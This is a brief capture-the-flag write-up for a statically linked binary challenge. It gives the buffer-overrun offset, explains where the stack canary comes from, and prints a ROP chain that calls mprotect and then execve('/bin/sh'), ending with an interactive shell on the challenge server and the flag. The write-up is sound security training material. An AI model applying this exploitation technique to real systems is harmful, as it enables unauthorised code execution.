# Solve 

Bug: Buffer overrun 
Offset: 10 

Is says that canary is found but I couldn't see any checks for canary bytes in the main program.  
That is because libc is statically linked and uses canaries..  

Played around with different solution. Wanted to try to use mprotect since it was available but it's really no need for it because it is possible to write to .bss anyway. PIE is not activated and the binary is statically linked so plenty of gadgets to use. 

Use ROPGadget to get suitable gadget:

```
root@efcb893234f1:~/byuctf/stat# python3 solve.py 
[*] '/root/byuctf/stat/static'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to static.chal.cyberjousting.com on port 1350: Done
[*] Loaded 122 cached gadgets for 'static'
len shellcode: 48
ROP chain:
0x0000:         0x401fe0 pop rdi; ret
0x0008:         0x49f000
0x0010:         0x4062d8 pop rsi; ret
0x0018:           0x1000
0x0020:         0x432972
0x0028:              0x7
0x0030:         0x410870 __mprotect
0x0038:         0x4062d8 pop rsi; ret
0x0040:         0x49f040 completed.1
0x0048:         0x41069c pop rax; ret
0x0050: 0x68732f6e69622f
0x0058:         0x4116c1
0x0060:         0x401fe0 pop rdi; ret
0x0068:         0x49f040 completed.1
0x0070:         0x4062d8 pop rsi; ret
0x0078:              0x0
0x0080:         0x432972
0x0088:              0x0
0x0090:         0x41069c pop rax; ret
0x0098:             0x3b
0x00a0:         0x401194 syscall

[*] Switching to interactive mode
$ ls
flag.txt
start.sh
static
$ cat flag.txt
byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}
$
```

